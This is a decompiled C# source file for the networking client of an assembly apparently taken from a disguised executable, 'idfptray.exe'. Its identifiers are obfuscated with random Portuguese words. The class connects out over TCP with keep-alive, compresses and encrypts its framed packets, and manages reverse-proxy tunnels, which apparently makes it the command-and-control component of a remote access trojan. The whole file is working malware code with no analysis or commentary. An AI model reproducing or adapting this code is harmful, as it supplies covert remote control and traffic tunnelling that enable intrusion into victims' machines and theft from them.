// Decompiled with JetBrains decompiler
// Type: VERMELHO265MONARCA.Core.Networking.Client
// Assembly: madre, Version=1.1.2.3, Culture=neutral, PublicKeyToken=null
// MVID: E3E81F5F-5E79-4C7B-AA1D-713B5D376685
// Assembly location: C:\Users\Marcos Abreu\Documents\XPCTRA\idfptray.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using VERMELHO265MONARCA.Core.Commands;
using VERMELHO265MONARCA.Core.Compression;
using VERMELHO265MONARCA.Core.Cryptography;
using VERMELHO265MONARCA.Core.Extensions;
using VERMELHO265MONARCA.Core.NetSerializer;
using VERMELHO265MONARCA.Core.Packets;
using VERMELHO265MONARCA.Core.ReverseProxy;
using VERMELHO265MONARCA.Core.ReverseProxy.Packets;
using VERMELHO265MONARCA.Core.Utilities;

namespace VERMELHO265MONARCA.Core.Networking
{
  public class Client
  {
    private readonly object ANIQUILADO150DIREMLock = new object();
    private readonly Queue<byte[]> CANGURU414BOATE = new Queue<byte[]>();
    private readonly object EXOTERICO507VALSALock = new object();
    private readonly Queue<byte[]> COMEU219INTENSIVOs = new Queue<byte[]>();
    private readonly object COR280PREFERIVEL = new object();
    private Client.ReceiveType _receiveState = Client.ReceiveType.Header;
    private Socket ZEN56BUFE;
    private List<JANTAR426CAVE> ANIQUILADO150DIREM;
    private byte[] COMEU219INTENSIVO;
    private byte[] COMUMDEDOIS161AEROMOCA;
    private bool EXOTERICO507VALSA;
    private bool _readingPackets;
    private byte[] DERROCADA370BIBLIA;
    private bool EPIDERMICO239INTERFIXO;
    private int CONVENCAO760OFTALMOLOGIA;
    private int _writeOffset;
    private int DERROCADA370BIBLIAOffset;
    private int PRECONIZAR398ADIDO;
    private int ESTERILIZACAO63DESPIDO;
    private const bool encryptionEnabled = true;
    private const bool compressionEnabled = true;

    public event Client.ClientFailEventHandler ClientFail;

    private void PATINACAO334UNIFAMILIAR(Exception ex)
    {
      // ISSUE: reference to a compiler-generated field
      Client.ClientFailEventHandler clientFail = this.ClientFail;
      if (clientFail == null)
        return;
      clientFail(this, ex);
    }

    public event Client.ClientStateEventHandler ClientState;

    private void OnClientState(bool ESLAVO393ZE)
    {
      if (this.Connected == ESLAVO393ZE)
        return;
      this.Connected = ESLAVO393ZE;
      // ISSUE: reference to a compiler-generated field
      Client.ClientStateEventHandler clientState = this.ClientState;
      if (clientState == null)
        return;
      clientState(this, ESLAVO393ZE);
    }

    public event Client.ClientReadEventHandler ClientRead;

    private void OnClientRead(IPacket ESQUISITICE447CAFONA)
    {
      // ISSUE: reference to a compiler-generated field
      Client.ClientReadEventHandler clientRead = this.ClientRead;
      if (clientRead == null)
        return;
      clientRead(this, ESQUISITICE447CAFONA);
    }

    public event Client.ClientWriteEventHandler ClientWrite;

    private void FONOTECA998PARTITURA(IPacket ESQUISITICE447CAFONA, long length, byte[] rawData)
    {
      // ISSUE: reference to a compiler-generated field
      Client.ClientWriteEventHandler clientWrite = this.ClientWrite;
      if (clientWrite == null)
        return;
      clientWrite(this, ESQUISITICE447CAFONA, length, rawData);
    }

    public int BUFFER_SIZE
    {
      get
      {
        return 16384;
      }
    }

    public uint KEEP_ALIVE_TIME
    {
      get
      {
        return 25000;
      }
    }

    public uint KEEP_ALIVE_INTERVAL
    {
      get
      {
        return 25000;
      }
    }

    public int HEADER_SIZE
    {
      get
      {
        return 4;
      }
    }

    public int MAX_PACKET_SIZE
    {
      get
      {
        return 5242880;
      }
    }

    public JANTAR426CAVE[] ProxyClients
    {
      get
      {
        lock (this.ANIQUILADO150DIREMLock)
          return this.ANIQUILADO150DIREM.ToArray();
      }
    }

    public bool Connected { get; private set; }

    protected Serializer Serializer { get; set; }

    protected Client()
    {
      this.ANIQUILADO150DIREM = new List<JANTAR426CAVE>();
      this.COMEU219INTENSIVO = new byte[this.BUFFER_SIZE];
      this.DERROCADA370BIBLIA = new byte[this.HEADER_SIZE];
    }

    protected void Connect(IPAddress ip, ushort port)
    {
      try
      {
        this.Disconnect();
        this.ZEN56BUFE = new Socket(ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
        this.ZEN56BUFE.SetKeepAliveEx(this.KEEP_ALIVE_INTERVAL, this.KEEP_ALIVE_TIME);
        this.ZEN56BUFE.Connect(ip, (int) port);
        if (!this.ZEN56BUFE.Connected)
          return;
        this.ZEN56BUFE.BeginReceive(this.COMEU219INTENSIVO, 0, this.COMEU219INTENSIVO.Length, SocketFlags.None, new AsyncCallback(this.PROMPT443PENIS), (object) null);
        this.OnClientState(true);
      }
      catch (Exception ex)
      {
        this.PATINACAO334UNIFAMILIAR(ex);
      }
    }

    private void PROMPT443PENIS(IAsyncResult result)
    {
      int length;
      try
      {
        length = this.ZEN56BUFE.EndReceive(result);
        if (length <= 0)
          throw new Exception("no bytes transferred");
      }
      catch (NullReferenceException ex)
      {
        return;
      }
      catch (ObjectDisposedException ex)
      {
        return;
      }
      catch (Exception ex)
      {
        this.Disconnect();
        return;
      }
      byte[] numArray = new byte[length];
      try
      {
        Array.Copy((Array) this.COMEU219INTENSIVO, (Array) numArray, numArray.Length);
      }
      catch (Exception ex)
      {
        this.PATINACAO334UNIFAMILIAR(ex);
        return;
      }
      lock (this.COMEU219INTENSIVOs)
        this.COMEU219INTENSIVOs.Enqueue(numArray);
      lock (this.COR280PREFERIVEL)
      {
        if (!this._readingPackets)
        {
          this._readingPackets = true;
          ThreadPool.QueueUserWorkItem(new WaitCallback(this.PROMPT443PENIS));
        }
      }
      try
      {
        this.ZEN56BUFE.BeginReceive(this.COMEU219INTENSIVO, 0, this.COMEU219INTENSIVO.Length, SocketFlags.None, new AsyncCallback(this.PROMPT443PENIS), (object) null);
      }
      catch (ObjectDisposedException ex)
      {
      }
      catch (Exception ex)
      {
        this.PATINACAO334UNIFAMILIAR(ex);
      }
    }

    private void PROMPT443PENIS(object state)
    {
      while (true)
      {
        byte[] numArray;
        lock (this.COMEU219INTENSIVOs)
        {
          if (this.COMEU219INTENSIVOs.Count == 0)
          {
            lock (this.COR280PREFERIVEL)
            {
              this._readingPackets = false;
              break;
            }
          }
          else
            numArray = this.COMEU219INTENSIVOs.Dequeue();
        }
        this.PRECONIZAR398ADIDO += numArray.Length;
        bool flag1 = true;
        while (flag1)
        {
          switch (this._receiveState)
          {
            case Client.ReceiveType.Header:
              if (this.PRECONIZAR398ADIDO + this.DERROCADA370BIBLIAOffset >= this.HEADER_SIZE)
              {
                int length = this.EPIDERMICO239INTERFIXO ? this.HEADER_SIZE - this.DERROCADA370BIBLIAOffset : this.HEADER_SIZE;
                try
                {
                  if (this.EPIDERMICO239INTERFIXO)
                  {
                    try
                    {
                      Array.Copy((Array) numArray, this.CONVENCAO760OFTALMOLOGIA, (Array) this.DERROCADA370BIBLIA, this.DERROCADA370BIBLIAOffset, length);
                    }
                    catch (Exception ex)
                    {
                      flag1 = false;
                      this.PATINACAO334UNIFAMILIAR(ex);
                      break;
                    }
                    this.ESTERILIZACAO63DESPIDO = BitConverter.ToInt32(this.DERROCADA370BIBLIA, 0);
                    this.DERROCADA370BIBLIAOffset = 0;
                    this.EPIDERMICO239INTERFIXO = false;
                  }
                  else
                    this.ESTERILIZACAO63DESPIDO = BitConverter.ToInt32(numArray, this.CONVENCAO760OFTALMOLOGIA);
                  if (this.ESTERILIZACAO63DESPIDO <= 0 || this.ESTERILIZACAO63DESPIDO > this.MAX_PACKET_SIZE)
                    throw new Exception("invalid header");
                }
                catch (Exception ex)
                {
                  flag1 = false;
                  this.Disconnect();
                  break;
                }
                this.PRECONIZAR398ADIDO -= length;
                this.CONVENCAO760OFTALMOLOGIA += length;
                this._receiveState = Client.ReceiveType.Payload;
                break;
              }
              try
              {
                Array.Copy((Array) numArray, this.CONVENCAO760OFTALMOLOGIA, (Array) this.DERROCADA370BIBLIA, this.DERROCADA370BIBLIAOffset, this.PRECONIZAR398ADIDO);
              }
              catch (Exception ex)
              {
                flag1 = false;
                this.PATINACAO334UNIFAMILIAR(ex);
                break;
              }
              this.DERROCADA370BIBLIAOffset += this.PRECONIZAR398ADIDO;
              this.EPIDERMICO239INTERFIXO = true;
              flag1 = false;
              break;
            case Client.ReceiveType.Payload:
              if (this.COMUMDEDOIS161AEROMOCA == null || this.COMUMDEDOIS161AEROMOCA.Length != this.ESTERILIZACAO63DESPIDO)
                this.COMUMDEDOIS161AEROMOCA = new byte[this.ESTERILIZACAO63DESPIDO];
              int length1 = this._writeOffset + this.PRECONIZAR398ADIDO >= this.ESTERILIZACAO63DESPIDO ? this.ESTERILIZACAO63DESPIDO - this._writeOffset : this.PRECONIZAR398ADIDO;
              try
              {
                Array.Copy((Array) numArray, this.CONVENCAO760OFTALMOLOGIA, (Array) this.COMUMDEDOIS161AEROMOCA, this._writeOffset, length1);
              }
              catch (Exception ex)
              {
                flag1 = false;
                this.PATINACAO334UNIFAMILIAR(ex);
                break;
              }
              this._writeOffset += length1;
              this.CONVENCAO760OFTALMOLOGIA += length1;
              this.PRECONIZAR398ADIDO -= length1;
              if (this._writeOffset == this.ESTERILIZACAO63DESPIDO)
              {
                bool flag2 = this.COMUMDEDOIS161AEROMOCA.Length == 0;
                if (!flag2)
                {
                  this.COMUMDEDOIS161AEROMOCA = Crybra.Decrypt(this.COMUMDEDOIS161AEROMOCA);
                  flag2 = this.COMUMDEDOIS161AEROMOCA.Length == 0;
                }
                if (!flag2)
                {
                  try
                  {
                    this.COMUMDEDOIS161AEROMOCA = SafeQuickLZ.Decompress(this.COMUMDEDOIS161AEROMOCA);
                  }
                  catch (Exception ex)
                  {
                    flag1 = false;
                    this.Disconnect();
                    break;
                  }
                  flag2 = this.COMUMDEDOIS161AEROMOCA.Length == 0;
                }
                if (flag2)
                {
                  flag1 = false;
                  this.Disconnect();
                  break;
                }
                using (MemoryStream memoryStream = new MemoryStream(this.COMUMDEDOIS161AEROMOCA))
                {
                  try
                  {
                    this.OnClientRead((IPacket) this.Serializer.Deserialize((Stream) memoryStream));
                  }
                  catch (Exception ex)
                  {
                    flag1 = false;
                    this.PATINACAO334UNIFAMILIAR(ex);
                    break;
                  }
                }
                this._receiveState = Client.ReceiveType.Header;
                this.COMUMDEDOIS161AEROMOCA = (byte[]) null;
                this.ESTERILIZACAO63DESPIDO = 0;
                this._writeOffset = 0;
              }
              if (this.PRECONIZAR398ADIDO == 0)
              {
                flag1 = false;
                break;
              }
              break;
          }
        }
        if (this._receiveState == Client.ReceiveType.Header)
          this._writeOffset = 0;
        this.CONVENCAO760OFTALMOLOGIA = 0;
        this.PRECONIZAR398ADIDO = 0;
      }
    }

    public void Send<T>(T ESQUISITICE447CAFONA) where T : IPacket
    {
      if (!this.Connected || (object) ESQUISITICE447CAFONA == null)
        return;
      lock (this.CANGURU414BOATE)
      {
        using (MemoryStream memoryStream = new MemoryStream())
        {
          try
          {
            this.Serializer.Serialize((Stream) memoryStream, (object) ESQUISITICE447CAFONA);
          }
          catch (Exception ex)
          {
            this.PATINACAO334UNIFAMILIAR(ex);
            return;
          }
          byte[] array = memoryStream.ToArray();
          this.CANGURU414BOATE.Enqueue(array);
          this.FONOTECA998PARTITURA((IPacket) ESQUISITICE447CAFONA, (long) array.Length, array);
          lock (this.EXOTERICO507VALSALock)
          {
            if (this.EXOTERICO507VALSA)
              return;
            this.EXOTERICO507VALSA = true;
          }
          ThreadPool.QueueUserWorkItem(new WaitCallback(this.Send));
        }
      }
    }

    public void SendBlocking<T>(T ESQUISITICE447CAFONA) where T : IPacket
    {
      this.Send<T>(ESQUISITICE447CAFONA);
      while (this.EXOTERICO507VALSA)
        Thread.Sleep(10);
    }

    private void Send(object state)
    {
      while (true)
      {
        if (this.Connected)
        {
          byte[] payload;
          lock (this.CANGURU414BOATE)
          {
            if (this.CANGURU414BOATE.Count == 0)
            {
              this.SendCleanup(false);
              return;
            }
            payload = this.CANGURU414BOATE.Dequeue();
          }
          try
          {
            this.ZEN56BUFE.Send(this.APARADOR3TECLADO(payload));
          }
          catch (Exception ex)
          {
            this.PATINACAO334UNIFAMILIAR(ex);
            this.SendCleanup(true);
            return;
          }
        }
        else
          break;
      }
      this.SendCleanup(true);
    }

    private byte[] APARADOR3TECLADO(byte[] payload)
    {
      payload = SafeQuickLZ.Compress(payload, 3);
      payload = Crybra.Encrypt(payload);
      byte[] numArray = new byte[payload.Length + this.HEADER_SIZE];
      Array.Copy((Array) BitConverter.GetBytes(payload.Length), (Array) numArray, this.HEADER_SIZE);
      Array.Copy((Array) payload, 0, (Array) numArray, this.HEADER_SIZE, payload.Length);
      return numArray;
    }

    private void SendCleanup(bool clear = false)
    {
      lock (this.EXOTERICO507VALSALock)
        this.EXOTERICO507VALSA = false;
      if (!clear)
        return;
      lock (this.CANGURU414BOATE)
        this.CANGURU414BOATE.Clear();
    }

    public void Disconnect()
    {
      if (this.ZEN56BUFE != null)
      {
        this.ZEN56BUFE.Close();
        this.ZEN56BUFE = (Socket) null;
        this.CONVENCAO760OFTALMOLOGIA = 0;
        this._writeOffset = 0;
        this.DERROCADA370BIBLIAOffset = 0;
        this.PRECONIZAR398ADIDO = 0;
        this.ESTERILIZACAO63DESPIDO = 0;
        this.COMUMDEDOIS161AEROMOCA = (byte[]) null;
        this._receiveState = Client.ReceiveType.Header;
        if (this.ANIQUILADO150DIREM != null)
        {
          lock (this.ANIQUILADO150DIREMLock)
          {
            try
            {
              foreach (JANTAR426CAVE jantaR426Cave in this.ANIQUILADO150DIREM)
                jantaR426Cave.Disconnect();
            }
            catch (Exception ex)
            {
            }
          }
        }
        if (CALHAMBEQUE892INFLAMATORIO.StreamCodec != null)
        {
          CALHAMBEQUE892INFLAMATORIO.StreamCodec.Dispose();
          CALHAMBEQUE892INFLAMATORIO.StreamCodec = (UnsafeStreamCodec) null;
        }
      }
      this.OnClientState(false);
    }

    public void ConnectReverseProxy(FAROFA785MANOBRA command)
    {
      lock (this.ANIQUILADO150DIREMLock)
        this.ANIQUILADO150DIREM.Add(new JANTAR426CAVE(command, this));
    }

    public JANTAR426CAVE GetReverseProxyByConnectionId(int connectionId)
    {
      lock (this.ANIQUILADO150DIREMLock)
        return this.ANIQUILADO150DIREM.FirstOrDefault<JANTAR426CAVE>((Func<JANTAR426CAVE, bool>) (t => t.ConnectionId == connectionId));
    }

    public void RemoveProxyClient(int connectionId)
    {
      try
      {
        lock (this.ANIQUILADO150DIREMLock)
        {
          for (int index = 0; index < this.ANIQUILADO150DIREM.Count; ++index)
          {
            if (this.ANIQUILADO150DIREM[index].ConnectionId == connectionId)
            {
              this.ANIQUILADO150DIREM.RemoveAt(index);
              break;
            }
          }
        }
      }
      catch
      {
      }
    }

    public delegate void ClientFailEventHandler(Client s, Exception ex);

    public delegate void ClientStateEventHandler(Client s, bool ESLAVO393ZE);

    public delegate void ClientReadEventHandler(Client s, IPacket ESQUISITICE447CAFONA);

    public delegate void ClientWriteEventHandler(Client s, IPacket ESQUISITICE447CAFONA, long length, byte[] rawData);

    public enum ReceiveType
    {
      Header,
      Payload,
    }
  }
}
